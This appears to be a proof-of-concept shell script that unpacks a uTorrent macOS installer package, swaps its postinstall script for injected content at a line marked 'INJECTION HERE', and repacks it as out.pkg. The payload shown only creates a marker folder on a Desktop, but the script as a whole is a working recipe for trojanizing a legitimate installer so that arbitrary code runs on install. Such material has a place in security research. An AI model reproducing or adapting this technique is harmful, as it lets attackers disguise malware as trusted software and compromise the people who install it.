mkdir tmp
cd tmp

cp ../in.pkg ./in.pkg

xar -xf ./in.pkg
rm ./in.pkg

# CHOSE PKG
cd uTorrent_Web_Installer.pkg

mv Scripts Scripts.tmp
mkdir Scripts
cd Scripts
cpio -i -F ../Scripts.tmp
rm ../Scripts.tmp

# INJECTION HERE
echo "#!/bin/bash\nmkdir /Users/taguar/Desktop/INJECTION_202" > postinstall

cd ../../

pkgutil --flatten . out.pkg